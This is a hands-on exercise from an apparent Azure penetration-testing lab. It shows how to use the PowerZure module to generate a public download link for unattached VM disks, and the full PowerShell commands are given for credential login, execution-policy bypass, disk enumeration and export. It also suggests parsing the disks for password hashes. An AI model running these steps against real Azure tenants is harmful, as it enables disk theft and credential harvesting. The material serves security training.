

### Hands-on exercise â€“ exfiltrating VM disks using PowerZure
In this exercise, we will exploit the Disk Export feature of Azure VMs to exfiltrate unattached or reserved VM disks.

1. In a PowerShell console on your pentest VM, use the following commands to authenticate to Entra ID (Azure AD) and Azure as the **`Ava`**. Replace the **`USERNAME`** and **`PASSWORD`** placeholders with the real values of Ava's credentials from the **`LABXX-Info`** exercise file.

```
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
Connect-AzureAD -Credential $cred
```

2. Import the PowerZure module into your PowerShell session with the following commands.
```
cd "$env:SystemDrive\PentestTools\Azure\Attack\PowerZure"

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

Import-Module .\PowerZure.psm1
```

3. Obtain a list of all unattached VM disks using the following command:
```
Get-AzDisk | Where-Object {$_.DiskState -ne "Attached"} | Select Name, DiskState, Encryption
```

4. The output of the command should return all managed disks that are not currently attached to a running VM and their encryption status. In your output, you should see a disk that has a name starting with winvm02; make a note of the disk name as it will be needed in the next step.

5. In the PowerShell console, use the following command to generate a publicly accessible URL to export the disk identified in the previous step. Replace the <DISK_NAME_FROM_STEP_4> placeholder with the name of the disk that was identified in the previous step:
```
Get-AzureVMDisk -DiskName <DISK_NAME_FROM_STEP_4>
```

6. Get-AzureVMDisk is a PowerZure module that exploits the Disk Export feature to generate a link to download a VM's disk. You should get a URL from the command output. Make a note of this URL as it will be needed in the next step.

7. To download the disk, open a web browser and browse to the URL that you obtained in the previous step from the internet:
* This final step is completely optional. This disk can be mounted in another VM and parsed for sensitive files and Windows password hashes.